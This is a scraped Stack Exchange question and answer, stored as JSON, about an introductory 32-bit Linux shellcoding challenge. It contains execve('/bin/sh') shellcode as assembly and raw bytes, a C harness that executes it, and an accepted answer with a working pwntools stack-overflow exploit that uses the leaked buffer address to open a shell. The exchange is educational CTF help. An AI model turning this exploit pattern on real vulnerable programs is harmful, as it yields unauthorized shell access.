@@ -1,0 +1,56 @@
+{
+    "title": "Shellcode challenge - shellcode works in test program, segfaults in actual binary",
+    "link": "https://reverseengineering.stackexchange.com/questions/18492/shellcode-challenge-shellcode-works-in-test-program-segfaults-in-actual-binar",
+    "content": "Currently working through an introductory shellcoding challenge, and having trouble getting the shellcode to work consistently.\nI'm working on a 32bit Linux binary. I found this shellcode:\nhttp://shell-storm.org/shellcode/files/shellcode-827.php\n<pre><code>xor    %eax,%eax\npush   %eax\npush   $0x68732f2f\npush   $0x6e69622f\nmov    %esp,%ebx\npush   %eax\npush   %ebx\nmov    %esp,%ecx\nmov    $0xb,%al\nint    $0x80\n</code></pre>\nAs a first step, I ran the shellcode in a simple test program:\n<pre><code>#include<stdio.h>\n#include<string.h>\n\nunsigned char code[] = \\ \n\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\"\n\"\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\";\n\nmain()\n{\n    printf(\"Shellcode length: %d\n\", strlen(code));\n    int (*ret)() = (int(*)())code;\n    ret();\n}\n</code></pre>\nShellcode works perfectly in this test program. Problems start when I move the shellcode into the actual challenge binary. I can confirm in GDB that:\n\nCode execution is re-directed into the stack.\nThe shellcode assembly is correct in the stack.\n\nHowever, when program execution gets to one of these two lines in the shellcode:\n<pre><code>0xffffd0e4:    push       %ebx\n0xffffd0e5:    mov        %esp,%ecx\n</code></pre>\nI get:\n<pre><code>SIGSEGV, Segmentation fault\n</code></pre>\nMy question is: why does shellcode that works in a test program fail in the actual binary? How would I go about troubleshooting this?\nThank you!\n",
+    "votes": "7",
+    "answers": 1,
+    "views": "1k",
+    "tags": [
+        "shellcode"
+    ],
+    "user": "BronzeOtter",
+    "time": "Jun 9, 2018 at 17:18",
+    "comments": [
+        {
+            "user": "Paweł Łukasik",
+            "text": "Can you share the binary?\n",
+            "time": null
+        },
+        {
+            "user": "Megabeets",
+            "text": "Is the stack of the binary is executable? We won't be able to tell you the exact problem without the binary itself.\n",
+            "time": null
+        },
+        {
+            "user": "BronzeOtter",
+            "text": "@PawełŁukasik Thank you so much for taking a look. Here is a link to the binary: wetransfer.com/downloads/…\n",
+            "time": null
+        },
+        {
+            "user": "BronzeOtter",
+            "text": "@MegabeetsThank you! Just shared the binary in the link above.\n",
+            "time": null
+        },
+        {
+            "user": "Paweł Łukasik",
+            "text": "I've pwn this bin using your shellcode and see no issues. Can you post the code that does the code execution redirection?\n",
+            "time": null
+        }
+    ],
+    "answers_data": [
+        {
+            "content": "It looks like you have two issues.\n1) You are overwriting your input buffer with those <pre><code>push</code></pre>-es so that why you have some junk on the stack and that's why our application crashes.\nSee those two pictures that show your assembly before and after executing the second push for the /bin/sh\nBefore\n\nAfter\n\nYou can clearly see odd <pre><code>das</code></pre> and <pre><code>bound</code></pre> opcodes instead of <pre><code>push</code></pre>es.\n2) You're not taking into account that the code is relocated so your buffer is not always in the same place. When you run from <pre><code>gdb</code></pre> you have the code that will jump to the beginning of the buffer (this is the part <pre><code>\\xc0\\xd0\\xff\\xff</code></pre>) and for your <pre><code>gdb</code></pre> sessions, this is true since <pre><code>gdb</code></pre> turns ASLR off. \nYou can check that by issuing this command in <pre><code>gdb</code></pre>:\n\ngdb-peda$ show disable-randomization \n  Disabling randomization of debuggee's virtual address space is on.\n\nIf you change that by <pre><code>set disable-randomization off</code></pre> it should start failing also in <pre><code>gdb</code></pre> as the buffer will be located each time at a different location.\nIn order to do this correctly, you need to locate where the buffer is. This is also why you have a tip where it is located in the first message.\nTo compensate for that two issues I would use pwntools for this and prepare a script:\n<pre><code>from pwn import *\n\ncontext(arch='i386', os='linux')\n\nr = process('./shellcoding.dms')\n# read the line that has the info about the address\nl = r.recvline()\nprint l\n# extract it\naddr = int(l[18:], 16)\n#nop sled at the end but not actually needed. We only need to fill the space for the buffer to overwrite the ret\nexploit = \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"+\"\\x90\"*21 \nprint \"Address is: \"+hex(addr)\n# add an address to be taken from the stack by ret\nexploit += p32(addr) \n\nr.send(exploit+\"\n\")\n# read the \"ok... lets see if you got it...\" message\nr.recvline()\nr.interactive() #pwn\n</code></pre>\nRunning this should work!\n",
+            "votes": "9",
+            "user": "NirIzr",
+            "time": "Jun 12, 2018 at 5:35",
+            "is_accepted": true,
+            "comments": [
+                {
+                    "user": "BronzeOtter",
+                    "text": "<span class=\"comment-copy\">Awesome. Thank you, once again, for generously taking the time to help. I had no idea that having the NOPs after the shellcode vs. before the shellcode would have such a big effect. Pwntool code was also great. Was not aware of the p32() functionality, which is very helpful. On to the next one!</span>",
+                    "time": null
+                }
+            ]
+        }
+    ]
+}
